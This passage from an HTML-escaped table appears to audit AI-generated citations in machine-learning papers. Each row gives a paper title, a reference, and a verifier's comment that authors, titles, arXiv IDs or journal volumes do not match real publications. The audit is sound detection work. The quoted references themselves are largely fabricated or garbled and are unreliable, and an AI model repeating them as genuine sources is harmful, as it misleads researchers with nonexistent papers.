        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Z. Chen and N. Flammarion. When and why sam generalizes better: An optimization perspective. arXiv preprint arXiv:2206.09267, 2022.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. ArXiv ID leads to a different paper.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:64.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;A Unified Stability Analysis of SAM vs SGD: Role of Data Coherence and Emergence of Simplicity Bias&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;K. A. Sankararaman, S. Sankararaman, H. Pandey, S. Ganguli, and F. Bromberg. The impact of neural network overparameterization on gradient confusion and stochastic gradient descent. In 37th International Conference on Machine Learning (ICML), pages 8469-8479, 2020.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;This paper is a match, but all authors but the first (K. A. Sankararaman) are fabricated.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;MaterialRefGS: Reflective Gaussian Splatting with Multi-view Consistent Material Inference&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Why Physically-Based Rendering. Physically-based rendering. Procedia IUTAM, 13(127137):3, 2015 .&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author given and title appears to be garbled. Publisher, issue, year, and pages match this article.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Robust Reinforcement Learning in Finance: Modeling Market Impact with Elliptic Uncertainty Sets&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Pierre Casgrain, Anirudh Kulkarni, and Nicholas Watters. Learning to trade with continuous action spaces: Application to market making. arXiv preprint arXiv:2303.08603, 2023.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title or author match. ArXiv ID matches a different article.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Robust Reinforcement Learning in Finance: Modeling Market Impact with Elliptic Uncertainty Sets&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Z Ning and Y K Kwok. Q-learning for option pricing and hedging with transaction costs. Applied Economics, 52(55):6033-6048, 2020.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. No match in journal volume/issue.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Robust Reinforcement Learning in Finance: Modeling Market Impact with Elliptic Uncertainty Sets&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;W L Chan and R O Shelton. Can machine learning improve delta hedging? Journal of Derivatives, $9(1): 39-56,2001$.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. No match in journal volume/issue.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Robust Reinforcement Learning in Finance: Modeling Market Impact with Elliptic Uncertainty Sets&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Petter N Kolm, Sebastian Krügel, and Sergiy V Zadorozhnyi. Reinforcement learning for optimal hedging. The Journal of Trading, 14(4):4-17, 2019.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. There is no volume 14 of this journal.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Robust Reinforcement Learning in Finance: Modeling Market Impact with Elliptic Uncertainty Sets&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Kyung Hyun Park, Hyeong Jin Kim, and Woo Chang Kim. Deep reinforcement learning for limit order book-based market making. Expert Systems with Applications, 169:114338, 2021.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Publisher ID matches this article.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;FlowMixer: A Depth-Agnostic Neural Architecture for Interpretable Spatiotemporal Forecasting&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Moonseop Han and Elizabeth Qian. Robust prediction of dynamical systems with structured neural networks: Long-term behavior and chaos. Physica D: Nonlinear Phenomena, 427:133006, 2021.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Publisher ID matches this article.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;FlowMixer: A Depth-Agnostic Neural Architecture for Interpretable Spatiotemporal Forecasting&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Bart De Schutter and Serge P Hoogendoorn. Modeling and control of freeway traffic flow by state space neural networks. Neural Computing and Applications, 17(2):175-185, 2008.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title match, although Schutter and Hoogendorn have written or coauthored several related papers (example and example). Journal volume/issue matches an unrelated article.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;FlowMixer: A Depth-Agnostic Neural Architecture for Interpretable Spatiotemporal Forecasting&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Jaideep Pathak, Brian R Hunt, Georg M Goerg, and Themistoklis P Sapsis. Data-driven prediction of chaotic dynamics: Methods, challenges, and opportunities. Annual Review of Condensed Matter Physics, 14:379-401, 2023.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. No match in journal volume.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;FlowMixer: A Depth-Agnostic Neural Architecture for Interpretable Spatiotemporal Forecasting&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Alejandro Güemes, Stefano Discetti, and Andrea Ianiro. Coarse-grained physics-based prediction of three-dimensional unsteady flows via neural networks. Science Advances, 7(46):eabj0751, 2021.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title or author match. Doesn't exist in journal volume/issue.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:64.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;BNMusic: Blending Environmental Noises into Personalized Music&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Jeongseung Park, Minseon Yang, Minz Won Park, and Geonseok Lee. Diffsound: Differential sound manipulation with a few-shot supervision. In Proceedings of the IEEE/CVF Conference on Computer Vision and Pattern Recognition (CVPR) Workshops, pages 1767-1775, 2021.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title or author match. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Towards Multiscale Graph-based Protein Learning with Geometric Secondary Structural Motifs&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Wenxuan Sun, Tri Dao, Hongyu Zhuang, Zihang Dai, Albert Gu, and Christopher D Manning. Llamba: Efficient llms with mamba-based distillation. arXiv preprint arXiv:2502.14458, 2024.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;ArXiv ID leads to this article with a similar title and one matching author.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Towards Multiscale Graph-based Protein Learning with Geometric Secondary Structural Motifs&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Tri Dao, Shizhe Ma, Wenxuan Sun, Albert Gu, Sam Smith, Aapo Kyrola, Christopher D Manning, and Christopher Re. An empirical study of state space models for large language modeling. arXiv preprint arXiv:2406.07887, 2024.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Two authors (Tri Dao and Albert Gu), the arXiv ID, and the year match this paper. However, the title is only a partial match.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Fourier Clouds: Fast Bias Correction for Imbalanced Semi-Supervised Learning&lt;/p&gt;
      &lt;/cell&gt;
